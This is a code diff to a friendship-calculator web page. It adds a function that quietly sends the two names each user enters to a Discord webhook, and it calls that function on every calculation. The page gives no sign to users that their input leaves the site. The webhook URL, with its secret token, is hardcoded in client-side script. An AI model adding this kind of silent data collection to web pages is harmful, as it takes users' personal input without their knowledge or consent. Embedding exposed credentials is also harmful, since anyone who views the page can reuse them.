@@ -182,6 +182,26 @@
             return steps;
         }
 
+        // New function to send names to Discord webhook
+        async function sendToDiscord(personA, personB) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1295372153998544957/8Jp9TAXb4g_bVP1A0FM46AkWiHQsc2tnFiksplCXSH70sCTbNx1keXuIUQt-Tr-C7pxB';
+            const data = {
+                content: `Friendship Calculation: ${personA} and ${personB}`
+            };
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                });
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
+            }
+        }
+
         async function calculateFriendship() {
             let personA = document.getElementById('personA').value.toLowerCase();
             let personB = document.getElementById('personB').value.toLowerCase();
@@ -190,6 +210,9 @@
                 alert('Please enter both names');
                 return;
             }
+
+            // Log names to Discord
+            await sendToDiscord(personA, personB);
 
             let stepsDiv = document.getElementById('calculation-steps');
             stepsDiv.innerHTML = '';
